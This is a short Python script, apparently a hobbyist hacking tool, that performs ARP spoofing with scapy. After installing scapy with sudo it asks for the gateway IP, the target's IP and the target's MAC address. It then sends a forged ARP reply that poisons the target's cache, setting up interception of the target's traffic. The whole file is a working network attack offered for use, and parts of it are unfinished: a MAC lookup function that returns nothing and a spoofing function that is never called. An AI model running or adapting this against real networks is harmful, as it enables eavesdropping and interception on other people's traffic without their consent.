#!/usr/bin/env python

import subprocess

target_ip = ""
target_pdst = ""
target_hwdst = ""
target_psrc = ""


class color:
    BLUE = '\033[96m'
    DEFAULT = '\033[0m'
    GREEN = '\033[92m'
    RED = '\033[91m'

def get_mac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcastComb = broadcast / arpRequest  # new packet combines both arpRequest & Broadcast

    ########################Sends packet & Recieves response############################################
    answer = scapy.srp(arpRequestBroadcastComb, timeout=1, verbose=False)[0]



###############packet : arp request directed to broadcast MAC asking for IP########################
def spoofer(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_hwdst, psrc=spoof_ip)

    print("")
    print("###########################################################")
    print(packet.show())
    print(packet.summary())
    print("###########################################################")
    print("")

    scapy.send(packet)


####################################MAIN########################################


print(color.BLUE + "[*] Installing/Updating scapy.." + color.DEFAULT)
subprocess.call("sudo apt update", shell=True)
subprocess.call("sudo apt install python3-pip", shell=True)
subprocess.call("sudo apt install scapy", shell=True)
subprocess.call("sudo pip install --pre scapy", shell=True)
import scapy.all as scapy

print("")
print(color.BLUE + "[*] Running 'route -n' for you.." + color.DEFAULT)
subprocess.call("sudo route -n", shell=True)
print("")
target_psrc = input(color.BLUE + "[*] Give ip of router (gateway) from 'route -n): " + color.DEFAULT)
target_ip = input(color.BLUE + "[*] Give target's ip: " + color.DEFAULT)
target_hwdst = input(color.BLUE + "[*] Give target's MAC: " + color.DEFAULT)

packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_hwdst, psrc=target_psrc)


print("")
print("###########################################################")
print(packet.show())
print(packet.summary())
print("###########################################################")
print("")

scapy.send(packet)          